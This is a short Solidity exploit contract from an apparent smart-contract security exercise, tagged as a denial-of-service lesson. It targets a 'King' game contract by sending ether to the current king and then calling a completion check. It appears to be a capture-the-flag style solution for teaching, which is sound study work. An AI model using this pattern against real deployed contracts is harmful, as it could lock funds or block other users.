// SPDX-License-Identifier: MIT

/// @knowledgePoint Dos

/// @level 普通
pragma solidity ^0.6.0;

import "./King.sol";
contract Exploit {
    Check public check;
    address public _victim;
    constructor(address payable _check) public {
        check = Check(_check);
        _victim = address(check.king());
    }

    function attack() public payable{
        // (bool suc,) = _victim.call.gas(1000000).value(msg.value)("");
        (bool suc,) = _victim.call{value : 10}("");
        require(suc);

        check.isCompleted{value : 100}();
    }
}
